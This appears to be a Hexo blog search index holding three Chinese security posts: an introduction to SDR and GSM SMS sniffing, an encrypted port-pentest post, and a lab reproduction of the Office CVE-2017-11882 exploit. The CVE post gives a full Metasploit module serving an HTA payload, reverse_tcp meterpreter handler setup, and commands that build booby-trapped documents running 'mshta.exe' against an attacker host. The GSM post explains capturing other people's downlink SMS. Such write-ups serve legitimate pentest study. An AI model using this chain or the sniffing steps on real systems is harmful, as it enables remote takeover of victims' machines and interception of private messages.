<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[初识SDR与GSM嗅探]]></title>
    <url>%2F2018%2F05%2F25%2Fsdr_gsm%2F</url>
    <content type="text"><![CDATA[概述抽空了解下SDR以及GSM的一些知识。 射频通讯射频（RadioFrequency 简称RF）表示可以辐射到空间的电磁频率，频率范围从300KHz~300GHz之间。 射频简称RF射频就是射频电流，他是一种高频交流变化 电磁波的简称。美妙变化小于1000次的交流电称为低频电流，大于10000次的称为高频电流，而射频就是这样一种高频电流。高频（大于10K）； 射频（300K-300G）是高频段的较高频段；微波频段（300M-300G）又是射频的较高频段。 在整个射频通信中，主要包含以下几种频率：传输频率、接收频率、中频和基带频率。基带频率是用来调制数据的信号频率。 软件定义的无线电(Software Defined Radio，SDR) 是一种无线电广播通信技术，它基于软件定义的无线通信协议而非通过硬连线实现。频带、空中接口协议和功能可通过软件下载和更新来升级，而不用完全更换硬件。 其中已在硬件被典型地实现的组件（例如混频器，滤波器，放大器，调制器 / 解调器，检测器等）。 直接利用软体调变的方式而不需变更硬体架构，省去硬体架构调整的负担。 三款SDR平台： HackRF，bladeRF和USRP。 HackRFOneHackRFOne 是一款软件定义无线电外设，能够发送或接受1MHz至6GHz 的无线电信号。 hackRF One旨在支持现代和下一代无线电技术的测试和开发，是一个开源硬件平台，可用作USB外设或编程独立运行。 特性 HackRF最大支持20MHz的采样率 High Speed USB，USB供电接口 硬件/软件全部开源 全面支持GNURadio GNURadioGNURadio就是开源世界中软件无线电的代表项目，实现了软件无线电所需要的大部分模块，并且完成了对于采样数据流的缓冲、调度，并由开源社区集体维护。GNURadio对于软件无线电射频前端硬件的支持非常全面，例如USRP、HackRF、BladeRF等。 信号源由osmocom模块提供，设置好信号源的中心频率和采样率，对来自信号源的信号通过抽取，再经过低通滤波，只保留所要解调信号的频率范围，即调频信号的带宽，滤波器截止频率通过GUI Slider设置。滤波后的信号送入WBFM解调模块进行解调，输出即为音频信号，后送入Audio Sink，GNURadio会自动通过音频驱动将音频信号送到计算机的音频输出，在扬声器就会发出FM广播的声音。还可以加上GUI FFT Sink观察广播信号的频谱。 移动通信随着互联网的普及和智能手机的广泛应用，大家对2G、3G、4G网络并不陌生。然而什么是2G、3G、4G网络，很多人就只能懵逼的人为是上网速度有差异。 其实，真正从个人用户的角度来说，上述理解无可厚非。G指的是Generation，也就是“代”的意思。1G~5G等的定义，主要是从速率，业务类型，传输时延，还有各种切换成功率角度给出具体实现的技术不同。所以1G就是第一代移动通信系统的意思，2G、3G、4G、5G就分别指第二、三、四、五代移动通信系统，而这也确实是人为划代。 第一代移动通信：摩托罗拉8000X，即俗称“大哥大”，语音、短信第二代移动通信：主要的制式为GSM 以及CDMA IS95/CDMA2000 1x ，语音、短信、连入互联网。第三代移动通信（3G）：3G主流的制式主要就是WCDMA、CDMA2000 EVDO、TD-SCDMA、Wimax，提高了响应速度，降低了时延。第四代移动通信：整个网络更加扁平化，降低时延，提升用户感受，看视频。第五代移动通信：拭目以待。 GSM全球移动通信系统，即GSM(Global System for Mobile Communications)，是当前应用最为广泛的移动电话标准，GSM是一个蜂窝网络，蜂窝网络的原因，是因为一个数学结论，即以相同半径的圆形覆盖平面, 当圆心处于正六边形网格的各正六边形中心，也就是当圆心处于正三角网格的格点时所用圆的数量最少。作为运营商，为了考虑成本，不会建设大量多余的基站。 GSM加密采用A5算法。A5算法是一种序列密码，它是欧洲GSM标准中规定的加密算法，专用于数字蜂窝移动电话的加密，用于对从电话到基站连接的加密。A5的特点是效率高，适合硬件上高效实现。A5发展至今，有A5/1、A5/2、A5/3、A5/4、A5/5、A5/6、A5/7等7个版本，目前GSM终端一般都支持A5/1和A5/3，A5/4以上基本不涉及。 我们国家移动和联通的2G电话网络采用的是GSM。 现在都向像4G、5G转移，GSM 嗅探的用武之地越来越少，也只能依靠一些信号干扰器强制降级才能勉强有一些利用场景。 手机开机时的位置更新流程 MS（手机）向系统请求分配信令信道（SDCCH），MS倾向信号强的BTS，算法基站定，故有伪基站攻击 MSC收到手机发来的IMSI（国际移动用户标识号）可及消息； MSC（移动交换中心）将IMSI可及信息再发送给VLR（保存的是用户的动态信息和状态信息），VLR将IMSI不可及标记更新为IMSI可及； VLR反馈MSC可及信息信号； MSC再将反馈信号发给手机； 嗅探GSM每个国家所采用的每个操作码都使用GSM频率段中的不同的频率，通常是从900 Mhz开始。 可以使用kal 命令找到想嗅探的频率 或者直接查询，或者百度运营商GSM更快 使用gqrx寻找相关频率（gqrx 是 GNU Radio 的一个前端实现，主流的发行版软件源中均带有 gqrx。安装非常便捷，使用包管理器即可）： 结合wireshark： 注意点这里涉及到上行数据和下载数据，基站发到手机端的是下行短信，手机发送到基站的是上行短信。所以要嗅探到下行的短信相对容易（广播），所以可能看到GMS SMS内容(因为这些不加密…) 下行短信里没有短信接受者的号码，简单来讲，短信接受者的号码、IMEI等数据，只有在“Location Update”时才会在网络中出现，并且是以加密形式传输的。当接收短信时，基站根据之前位置更新时注册的信息，判断接收者的位置。所以，想要拿到接受者的号码，需要破解A5/1算法并还原出“Location Update”时的原文，Airprobe项目里有介绍如何破解A5/1算法找到Kc。 参考文章 很多情况下，把手机调成2G了也嗅探不到自己的短息，这是因为在所有操作成功的前提下，能嗅探到别人的短信却抓不到自己的大概是因为抓取的ARFCN和手机选择的ARFCN不是同一个，一个区域可能有几个到十几个可以注册的ARFCN，原则上手机一般会自动选择信号最强的ARFCN注册，但是具体注册哪里一个还是有手机系统来确定，所以要完整抓取一个区域内所有的下行短信。 其他应用超级跑马机跑马机的原理是伪造 GPS 信号，要伪造 GPS 信号,首先需要获取 GPS 卫星的观测数据,进行采样分析，制作轨迹文件，转换为信号发射出去,车载计程终端会被干扰,将其当做真实的 GPS 信号，跑马机上面的数值就会动起来。 重放攻击无线键盘重放攻击是一种简单、粗糙的攻击方式，只要有能够收发射频信号的硬件设备就可以实现，但越是简单的攻击方式就越难以防范。参考文章 伪基站伪基站，又称假基站、假基地台，是一种利用GSM单向认证缺陷的非法无线电通信设备，主要由主机和笔记本电脑组成，能够搜取以其为中心、一定半径范围内的GSM移动电话信息，并任意冒用他人手机号码强行向用户手机发送诈骗、推销等垃圾短信，通常安放在汽车或者一个比较隐蔽的地方发送。伪基站运行时，用户手机信号被强制连接到该设备上，无法连接到公用电信网络，以影响手机用户的正常使用。 伪基站利用移动信令监测系统监测移动通讯过程中的各种信令过程，获得手机用户当前的位置信息。伪基站启动后就会干扰和屏蔽一定范围内的运营商信号，之后则会搜索出附近的手机号，并将短信发送到这些号码上。屏蔽运营商的信号可以持续10秒到20秒，短信推送完成后，对方手机才能重新搜索到信号。大部分手机不能自动恢复信号，需要重启。伪基站能把发送号码显示为任意号码，甚至是邮箱号和特服号码。载有伪基站的车行驶速度不高于60公里/小时，可以向周边用户群发短信，因此，伪基站具有一定的流动性。 一些功率大的伪基站，辐射的范围很广，只要伪基站不关闭发射，就会不断的有手机被吸入。离基站越近，被吸入的可能性越大。当伪基站正在发送诈骗短信的时候，附近有一万人经过，至少有5000人会受到影响。]]></content>
      <categories>
        <category>spoof</category>
      </categories>
      <tags>
        <tag>sdr</tag>
        <tag>gsm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Office CVE-2017-11882 复现]]></title>
    <url>%2F2018%2F04%2F01%2FCVE-2017-11882%2F</url>
    <content type="text"><![CDATA[概述最新 Office 的 CVE-2017-11882，完美无弹窗，无视宏，影响 office 全版本。利用触发器 WebClient 服务从攻击者控制的 WebDav 服务器启动和执行远程文件。该脚本使用多个 OLE 对象创建简单的文档。这些对象利用 CVE-2017-11882，从而导致连续命令执行。 复现过程环境 win7 + office2010 (1921.168.111.100) Kali(192.168.111.183) Ridter 师傅改进过的脚本,43b命令长度不能超过43 bytes，109b命令长度不能超过109 bytes。 注意点：需要考虑到受害者的office是32还是64位数的，网上poc不一定都能成功，多试几个。 基本利用 生成漏洞 doc 文件，首先简单的测试一下是否能够弹出计算器，命令如下： 1python command43b_cve-2017-11882.py -c &quot;cmd.exe /c calc.exe&quot; -o test.doc 在测试机器上次文件打开： 结合msf利用PS_shell.rb 添加msf脚本PS_shell.rb，在/usr/share/metasploit-framework/modules/exploits/windows目录下新建个文件夹mytest，并命名为PS_shell.rb，代码如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule &lt; Msf::Exploit::Remote Rank = NormalRanking include Msf::Exploit::Remote::HttpServer def initialize(info = &#123;&#125;) super(update_info(info, &apos;Name&apos; =&gt; &apos;Microsoft Office Payload Delivery&apos;, &apos;Description&apos; =&gt; %q&#123; This module generates an command to place within a word document, that when executed, will retrieve a HTA payload via HTTP from an web server. Currently have not figured out how to generate a doc. &#125;, &apos;License&apos; =&gt; MSF_LICENSE, &apos;Arch&apos; =&gt; ARCH_X86, &apos;Platform&apos; =&gt; &apos;win&apos;, &apos;Targets&apos; =&gt; [ [&apos;Automatic&apos;, &#123;&#125; ], ], &apos;DefaultTarget&apos; =&gt; 0, )) end def on_request_uri(cli, _request) print_status(&quot;Delivering payload&quot;) p = regenerate_payload(cli) data = Msf::Util::EXE.to_executable_fmt( framework, ARCH_X86, &apos;win&apos;, p.encoded, &apos;hta-psh&apos;, &#123; :arch =&gt; ARCH_X86, :platform =&gt; &apos;win &apos;&#125; ) send_response(cli, data, &apos;Content-Type&apos; =&gt; &apos;application/hta&apos;) end def primer url = get_uri print_status(&quot;Place the following DDE in an MS document:&quot;) print_line(&quot;mshta.exe \&quot;#&#123;url&#125;\&quot;&quot;) endend 利用 msf 生成一个powershell 脚本： 12345use exploit/windows/mytest/PS_shellset payload windows/meterpreter/reverse_tcpset lhost 192.168.111.183set uripath abcexploit -j 生成漏洞 doc 文件，首先简单的测试一下是否能够弹出计算器，命令如下： 1python command43b_cve-2017-11882.py -c &quot;mshta.exe http://192.168.111.183:8080/abc&quot; -o test.doc (命令不能超过43字节) office_ms17_11882注意这个64位office可以成功，32位office不能成功。 利用 msf 生成一个恶意文件： 12use exploit/windows/fileformat/office_ms17_11882set LHOST 192.168.111.183 将恶意文件考出来然后运行即可。 hta_server 利用 msf 开启一个hta_server脚本： 1234use exploit/windows/misc/hta_serverset payload windows/meterpreter/reverse_tcpset lhost 192.168.111.183set URIPATH a 生成漏洞 doc 文件，首先简单的测试一下是否能够弹出计算器，命令如下： 1python command43b_cve-2017-11882.py -c &quot;mshta.exe http://192.168.111.183:8080/a&quot; -o test.doc (命令不能超过43字节) 总结这种类型的的漏洞还是要多接触一些，拓宽渗透思路。]]></content>
      <categories>
        <category>code execution</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>office</tag>
        <tag>code execution</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[端口渗透总结]]></title>
    <url>%2F2018%2F03%2F08%2Fport-pentest%2F</url>
    <content type="text"><![CDATA[本文章暂时加密，如有需要请联系本人。 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